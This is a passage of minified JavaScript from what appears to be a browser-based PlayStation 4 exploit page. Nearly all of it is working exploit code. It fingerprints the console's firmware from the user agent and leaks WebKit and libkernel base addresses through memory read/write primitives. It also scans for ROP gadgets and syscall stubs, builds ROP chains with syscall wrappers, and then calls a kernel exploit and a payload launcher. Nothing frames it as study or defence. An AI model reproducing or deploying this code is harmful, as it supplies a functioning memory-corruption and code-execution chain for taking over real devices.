9727==b?a.add32(c+6):0},gadgetmap_wk={ep:[91,65,92,65,93,65,94,65,95,93,195],"pop rsi":[94,195],"pop rdi":[95,195],"pop rsp":[92,195],"pop rax":[88,195],"pop rdx":[90,195],"pop rcx":[89,195],"pop rbp":[93,195],"pop r8":[71,88,195],"pop r9":[71,89,195],infloop:[235,254,195],ret:[195],"mov [rdi], rsi":[72,137,55,195],"mov [rax], rsi":[72,137,48,195],"mov [rdi], rax":[72,137,7,195],"mov rax, rdi":[72,137,248,195]},slowpath_jop=[72,139,127,72,72,139,7,72,139,64,48,255,224];slowpath_jop.reverse();var gadgets;window.stage2=function(){try{window.stage2_()}catch(a){throw a}};var spoofedFW={"5.00":"5.01",5.07:"5.05","9.00":"4.05",9.01:"4.55",9.02:"4.74",9.03:"5.01",9.04:"5.03",9.05:"5.05"},ua=navigator.userAgent,fwFromUA=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple"));fwFromUA in spoofedFW&&(fwFromUA=spoofedFW[fwFromUA]),"5.01"==fwFromUA?gadgetcache={ret:60,"jmp rax":130,ep:173,"pop rbp":182,"mov [rdi], rax":1332075,"pop r8":96709,"pop rax":17397,"mov rax, rdi":22736,"mov rax, [rax]":444474,"pop rsi":586634,"pop rdi":232890,"pop rcx":339545,"pop rsp":124551,"mov [rdi], rsi":146114,"mov [rax], rsi":2450855,"pop rdx":912834,"pop r9":12267727,jop:800720,infloop:22147018,"add rax, rcx":87771,"mov rdx, rax":3488369,"mov rdi, rax":22691759,"mov rax, rdx":1896032,"mov rbp, rsp":985418,"mov rax, [rdi]":290553,"add rdi, rax":5592687,"add rax, rsi":1384646,"and rax, rsi":22481439,"jmp rdi":2710974,longjmp:5352,createThread:7836048}:"5.05"==fwFromUA?gadgetcache={ret:60,"jmp rax":130,ep:173,"pop rbp":182,"mov [rdi], rax":3857131,"pop r8":96709,"pop rax":17397,"mov rax, rdi":22736,"mov rax, [rax]":444474,"pop rsi":586634,"pop rdi":232890,"pop rcx":339545,"pop rsp":124551,"mov [rdi], rsi":146114,"mov [rax], rsi":2451047,"pop rdx":1826852,"pop r9":12268047,jop:800720,infloop:22306474,"add rax, rcx":87771,"mov rdx, rax":3488561,"mov rdi, rax":22692143,"mov rax, rdx":1896224,"mov rbp, rsp":985418,"mov rax, [rdi]":290553,"add rdi, rax":5593055,"add rax, rsi":1384646,"and rax, rsi":22481823,"jmp rdi":2711166,longjmp:5352,createThread:7836560}:"4.74"==fwFromUA&&(gadgetcache={ret:60,"jmp rax":130,ep:173,"pop rbp":182,"mov [rdi], rax":16314,"pop r8":52290,"pop rax":52291,"mov rax, rdi":59470,"mov rax, [rax]":77987,"pop rsi":504302,"pop rdi":504381,"pop rcx":2563555,"pop rsp":2597968,"mov [rdi], rsi":3788656,"mov [rax], rsi":3999863,"pop rdx":6504314,"pop r9":7911967,jop:19362640,infloop:19677193,"add rax, rcx":8704077,"mov rdx, rax":76310,"mov rax, rdx":1986270,"mov rbp, rsp":1792890,"mov rax, [rdi]":1286688,"add rdi, rax":21090765,"add rax, rsi":13049540,"jmp rdi":1582869,ret2userland:561244,"add [r9], rbp":20057265,"mov rsp, rdx":15982288,test:10402,"sub rax, rcx":15288203,jop1:6108765,jop2:8064613,jop3:21151163,jop4:6519492,jop5:1792890,jop6:997661,"mov rsi, rdi":11705434,"mov [rsi], rdx":22495238,longjmp:5208,createThread:18279744}),window.stage2_=function(){if(4.74>parseFloat(fwFromUA)||5.05<parseFloat(fwFromUA))throw new Error("Only firmware 4.74 through 5.07 is supported");p=window.prim,p.leakfunc=function(a){var b=p.leakval(a);return p.read8(b.add32(24)).add32(64)};var a=p.leakfunc(parseFloat),b=p.read8(a),c=p.read8(a);c.low&=4294963200,"5.01"==fwFromUA||"5.05"==fwFromUA?c.sub32inplace(5734400):"4.74"==fwFromUA&&c.sub32inplace(15257600),window.webKitBase=c;var d=function(a){return c.add32(a)};"5.01"==fwFromUA?gadgets={__stack_chk_fail:d(200),__stack_chk_fail_offset:73408,memcmp:d(520),memcmp_offset:569248,memset:d(552),memset_offset:280,setjmp:d(5368)}:"5.05"==fwFromUA?gadgets={__stack_chk_fail:d(200),__stack_chk_fail_offset:73408,memcmp:d(520),memcmp_offset:569248,memset:d(552),memset_offset:280,setjmp:d(5368)}:"4.74"==fwFromUA&&(gadgets={__stack_chk_fail:d(200),__stack_chk_fail_offset:53648,memcmp:d(552),memcmp_offset:466016,memset:d(584),memset_offset:175632,setjmp:d(5224)});var e=p.read8(get_jmptgt(gadgets.memset));e.sub32inplace(gadgets.memset_offset);var f=p.read8(get_jmptgt(gadgets.__stack_chk_fail));f.sub32inplace(gadgets.__stack_chk_fail_offset),window.libKernelBase=f;window.o2lk=function(a){return f.add32(a)};var g=new Uint8Array(4096),h=p.leakval(g).add32(16),j=p.read8(h);p.write8(h,c),p.write4(h.add32(8),50670904);var k=0,l=[];for(var m in gadgetmap_wk)gadgetmap_wk.hasOwnProperty(m)&&(k++,l.push(m),gadgetmap_wk[m].reverse());k++;var n=function(a){if(gadgetcache)for(var b in k=0,slowpath_jop=0,gadgetcache)gadgetcache.hasOwnProperty(b)&&(gadgets[b]=d(gadgetcache[b]));else for(var c=0;c<g.length;c+=1){if(195==g[c]){for(var e,f=0;f<l.length;f++)if(e=1,l[f]){for(var h=gadgetmap_wk[l[f]],j=0;j<h.length;j++)if(h[j]!=g[c-j]){e=0;break}e&&(gadgets[l[f]]=d(c-h.length+1),gadgetoffs[l[f]]=c-h.length+1,delete l[f],k--)}}else if(224==g[c]&&255==g[c-1]&&slowpath_jop){for(var e=1,j=0;j<slowpath_jop.length;j++)if(slowpath_jop[j]!=g[c-j]){e=0;break}if(!e)continue;gadgets.jop=d(c-slowpath_jop.length+1),gadgetoffs.jop=c-slowpath_jop.length+1,k--,slowpath_jop=0}if(!k)break}if(!k&&!slowpath_jop)setTimeout(a,50);else{for(var f in print("missing gadgets: "),l)print(" - "+l[f]);slowpath_jop&&print(" - jop gadget")}};n(function(){});for(var o,q,r,s;o={a:0,b:0,c:0,d:0},q={a:0,b:0,c:0,d:0},s=p.leakval(q),r=p.leakval(o),r.low-48!=s.low;);[].length=128;var t,u=new Uint32Array(256);nogc.push(u);var v=function(b){var c=0,d=0,e=0;t=p.read8(p.leakval(u).add32(16)),p.write8(t.add32(48),gadgets.setjmp),p.write8(t.add32(128),gadgets.jop),p.write8(t,t),p.write8(a,gadgets.jop);var f=p.read8(s),g=p.read8(s.add32(72));return p.write8(s,t.add32(80)),p.write8(s.add32(72),t),parseFloat(q,q,q,q,q,q),p.write8(s,f),p.write8(s.add32(72),g),c=p.read8(t.add32(16)),rtv=Array.prototype.splice.apply({length:{valueOf:function(){e=p.read8(c),d=p.read8(c.add32(8));var a=c,f=b.count;b.push_write8(c,e),b.push_write8(c.add32(8),d),b.runtime&&(a=b.runtime(c)),b.push(gadgets["pop rsp"]),b.push(a),b.count=f,p.write8(c,gadgets["pop rsp"]),p.write8(c.add32(8),b.stackBase)}}}),p.leakval(rtv)};gadgets=gadgets,p.loadchain=v;var w=new Uint8Array(4096),x=p.leakval(w).add32(16),y=p.read8(x);p.write8(x,window.libKernelBase),p.write4(x.add32(8),262144);for(var z,A=0;262144>A;A+=1)if(114==w[A]&&100==w[A+1]&&108==w[A+2]&&111==w[A+3]&&99==w[A+4]){z=A;break}p.write4(x.add32(8),z+32),window.syscalls={};for(var B=new Uint32Array(1),C=new Uint8Array(B.buffer),A=0;A<z;A+=1)if(72==w[A]&&199==w[A+1]&&192==w[A+2]&&73==w[A+7]&&137==w[A+8]&&202==w[A+9]&&15==w[A+10]&&5==w[A+11]){C[0]=w[A+3],C[1]=w[A+4],C[2]=w[A+5],C[3]=w[A+6];var D=B[0];window.syscalls[D]=window.libKernelBase.add32(A)}var E,F=new window.rop;p.fcall_=function(a,b,c,d,e,f,g){if(F.clear(),F.notimes=this.next_notime,this.next_notime=1,F.fcall(a,b,c,d,e,f,g),F.push(window.gadgets["pop rdi"]),F.push(F.stackBase.add32(16376)),F.push(window.gadgets["mov [rdi], rax"]),F.push(window.gadgets["pop rax"]),F.push(p.leakval(1094795842)),1094795842!=F.run().low)throw new Error("unexpected rop behaviour");E=p.read8(F.stackBase.add32(16376))},p.fcall=function(){p.fcall_.apply(this,arguments);return E},p.readstr=function(a){for(var b=String.fromCharCode,c=a.add32(0),d=p.read4(c),e="";255&d;)e+=b(255&d),c.add32inplace(1),d=p.read4(c);return e},p.syscall=function(a,b,c,d,e,f,g){if("number"!=typeof a)throw new Error("Invalid syscall!");var h=window.syscalls[a];if(h==null)throw new Error("Invalid syscall!");return p.fcall(h,b,c,d,e,f,g)},p.stringify=function(a){for(var b=new Uint8Array(a.length+1),c=0;c<a.length;c+=1)b[c]=255&a.charCodeAt(c);return window.nogc.push(b),p.read8(p.leakval(b).add32(16))},p.malloc=function(a){var b=new Uint8Array(65536+a);window.nogc.push(b);var c=p.read8(p.leakval(b).add32(16));return c.backing=b,c},p.malloc32=function(a){var b=new Uint8Array(65536+4*a);window.nogc.push(b);var c=p.read8(p.leakval(b).add32(16));return c.backing=new Uint32Array(b.buffer),c};var G=p.syscall(23,0);if("0"!=G)for(;!kernExploit(););payloadLauncher()};</script><pre id=console></pre>
